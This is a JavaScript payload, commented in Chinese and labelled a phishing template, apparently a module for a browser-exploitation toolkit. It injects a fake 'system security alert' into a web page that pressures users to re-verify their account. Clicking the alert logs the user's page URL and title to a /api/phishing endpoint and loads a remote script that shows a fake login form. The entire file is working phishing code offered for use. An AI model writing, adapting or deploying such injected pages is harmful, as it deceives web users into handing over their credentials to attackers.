// 通知钓鱼模板
// 在页面上插入一个仿冒的系统通知，诱导用户点击

// 创建样式
const style = document.createElement('style');
style.textContent = `
.notification-container {
  position: fixed;
  top: 20px;
  right: 20px;
  width: 320px;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
  z-index: 9999;
  overflow: hidden;
  animation: slideIn 0.5s forwards;
}

@keyframes slideIn {
  from {
    transform: translateX(100%);
  }
  to {
    transform: translateX(0);
  }
}

.notification-header {
  display: flex;
  align-items: center;
  padding: 12px 15px;
  background-color: #f8f8f8;
  border-bottom: 1px solid #eaeaea;
}

.notification-icon {
  width: 24px;
  height: 24px;
  margin-right: 10px;
}

.notification-title {
  font-weight: bold;
  font-size: 16px;
  color: #333;
  flex-grow: 1;
}

.notification-close {
  background: none;
  border: none;
  color: #999;
  font-size: 18px;
  cursor: pointer;
}

.notification-body {
  padding: 15px;
}

.notification-message {
  margin: 0 0 15px 0;
  color: #333;
  font-size: 14px;
  line-height: 1.4;
}

.notification-buttons {
  display: flex;
  justify-content: flex-end;
}

.notification-button {
  padding: 8px 12px;
  border-radius: 4px;
  font-size: 14px;
  cursor: pointer;
  margin-left: 10px;
}

.primary-button {
  background-color: #0066cc;
  color: white;
  border: none;
}

.secondary-button {
  background-color: transparent;
  color: #666;
  border: 1px solid #ddd;
}
`;

// 创建通知元素
function createNotification(title, message, primaryAction) {
  const container = document.createElement('div');
  container.className = 'notification-container';
  
  // 通知头部
  const header = document.createElement('div');
  header.className = 'notification-header';
  
  const icon = document.createElement('img');
  icon.className = 'notification-icon';
  icon.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiMwMDY2Y2MiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTggOEE2IDYgMCAwIDAgNiA4YzAgNyAtMyA5IC0zIDlIMjFzLTMgLTIgLTMgLTl6Ij48L3BhdGg+PHBhdGggZD0iTTEzLjczIDIxYTIgMiAwIDAgMSAtMy40NiAwIj48L3BhdGg+PC9zdmc+';
  
  const titleElem = document.createElement('div');
  titleElem.className = 'notification-title';
  titleElem.textContent = title;
  
  const closeButton = document.createElement('button');
  closeButton.className = 'notification-close';
  closeButton.innerHTML = '&times;';
  closeButton.onclick = function() {
    document.body.removeChild(container);
  };
  
  header.appendChild(icon);
  header.appendChild(titleElem);
  header.appendChild(closeButton);
  
  // 通知内容
  const body = document.createElement('div');
  body.className = 'notification-body';
  
  const messageElem = document.createElement('p');
  messageElem.className = 'notification-message';
  messageElem.textContent = message;
  
  const buttons = document.createElement('div');
  buttons.className = 'notification-buttons';
  
  const dismissButton = document.createElement('button');
  dismissButton.className = 'notification-button secondary-button';
  dismissButton.textContent = '稍后处理';
  dismissButton.onclick = function() {
    document.body.removeChild(container);
  };
  
  const actionButton = document.createElement('button');
  actionButton.className = 'notification-button primary-button';
  actionButton.textContent = '立即处理';
  actionButton.onclick = function() {
    // 记录用户点击
    const clickData = {
      action: 'notification_click',
      url: window.location.href,
      title: document.title,
      timestamp: new Date().toISOString()
    };
    
    fetch('/api/phishing', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(clickData)
    });
    
    // 执行主要动作
    primaryAction();
    
    // 移除通知
    document.body.removeChild(container);
  };
  
  buttons.appendChild(dismissButton);
  buttons.appendChild(actionButton);
  
  body.appendChild(messageElem);
  body.appendChild(buttons);
  
  // 组装通知
  container.appendChild(header);
  container.appendChild(body);
  
  return container;
}

// 添加样式到页面
document.head.appendChild(style);

// 创建并显示通知
const notification = createNotification(
  '系统安全提醒', 
  '您的账户安全设置需要更新。请立即验证您的身份信息，以确保账户安全。',
  function() {
    // 点击后显示钓鱼登录框
    const loginScript = document.createElement('script');
    loginScript.src = '/api/module/phishing_login';
    document.body.appendChild(loginScript);
  }
);

document.body.appendChild(notification);

// 返回执行结果
return "钓鱼通知已插入页面";